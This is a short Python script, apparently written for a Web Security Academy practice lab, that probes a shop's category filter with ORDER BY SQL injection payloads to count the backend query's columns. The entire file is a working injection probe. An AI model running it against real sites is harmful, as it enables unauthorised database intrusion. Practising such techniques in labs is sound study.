import requests

ORDER_payloads = ["' ORDER BY "]

def order_injection(url):
    print("Try to find out the number of columns using ORDER BY")
    for i in range(1, 50):  # using this because hypothetically there is no database with 50 columns
        query = ORDER_payloads[0] + str(i) + " -- "
        r = requests.get(url + query)
        if r.status_code == 200:
            print("Column {} is present".format(i))
        else:
            print("Total number of columns are {}".format(i - 1))
            return i

#url = 'https://0a5f00fd03b033e38024901b00b90004.web-security-academy.net/filter?category=Pets'
url = 'https://0a54006703874062818c70830065003b.web-security-academy.net/filter?category=Gifts'
cols = order_injection(url)
